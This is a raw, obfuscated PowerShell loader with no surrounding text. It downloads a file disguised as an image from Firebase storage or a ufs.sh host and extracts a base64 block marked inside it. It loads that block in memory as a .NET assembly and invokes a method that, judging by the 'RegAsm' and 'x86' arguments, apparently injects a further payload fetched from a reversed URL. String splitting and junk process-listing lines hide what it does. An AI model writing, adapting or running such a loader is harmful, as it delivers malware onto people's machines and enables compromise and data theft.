
                    Start-Sleep -Seconds 3
                    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                    function DownloadDataFromLinks { param ([string[]]$links) 
                    $webClient = New-Object System.Net.WebClient; 
                    $shuffledLinks = Get-Random -InputObject $links -Count $links.Length; 
                    foreach ($link in $shuffledLinks) { try { return $webClient.DownloadData($link) } catch { continue } }; 
                    return $null }; 
                    $Bytes = 'http';
                    $Bytes2 = 's://';
                $lfsdfsdg =  $Bytes +$Bytes2;
                    $links = @(($lfsdfsdg + 'firebasestorage.googleapis.com/v0/b/hold-8fad5.firebasestorage.app/o/forst%2Fpic8.jpg?alt=media&token=6ecd6f25-6a77-46d2-975c-bc4394ce7217'),($lfsdfsdg + 'au72nuxzv2.ufs.sh/f/4LhV5B1sDCwIHfBMavimV1wYLDs37pB90InRJlTjGyKWqAcN'));        
                $imageBytes = DownloadDataFromLinks $links;
                        if ($imageBytes -ne $null) { $imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);
                     $startFlag = '<<BA' + 'SE' + '64_START>>'; $endFlag = '<<BASE64_END>>'; $startIndex = $imageText.IndexOf($startFlag); 
                    $endIndex = $imageText.IndexOf($endFlag);
                     if ($startIndex -ge 0 -and $endIndex -gt $startIndex) { $startIndex += $startFlag.Length; 
                    $base64Lengthh = $endIndex - $startIndex;
                     $base64Command = $imageText.Substring($startIndex, $base64Lengthh);
                   $endIndex = $imageText.IndexOf($endFlag);
                     $commandBytes = [System.Convert]::FromBase64String($base64Command);   $endIndex = $imageText.IndexOf($endFlag);   $endIndex = $imageText.IndexOf($endFlag);
                    $loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes);
                  Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | Format-Table Name,CPU
                    $type = $loadedAssembly.GetType('myprogram.Homees');

                  Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | Format-Table Name,CPU
                    $injec='Reg' + 'Asm';
                    $method = $type.GetMethod('runs' + 's').Invoke($null, [object[]] ('txt.jmcAcmp/sr.oc.agezopmodsanpkj//:s', '0', '', $injec, '1' , 'x86'))}}